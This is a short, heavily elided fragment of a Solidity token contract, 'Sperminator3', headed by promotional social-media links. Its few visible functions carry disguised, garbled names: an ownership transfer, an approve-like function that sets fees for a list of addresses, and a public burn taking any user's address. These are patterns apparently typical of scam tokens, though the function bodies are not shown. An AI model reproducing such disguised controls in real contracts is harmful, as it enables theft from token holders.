...
/**
https://t.me/Sperminator3erc
https://twitter.com/Sperminator3Erc
https://x.com/matt_furie/status/1788397413058920931?s=46&t=ibPEm-bix9EHAhEHXkskoA
Sperminator 3 by mattfurie
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipbsnnghsds(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Sperminator3 is Ownable {
    ...
    function Aapmbrove(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnlpisletyrs(address user) public {
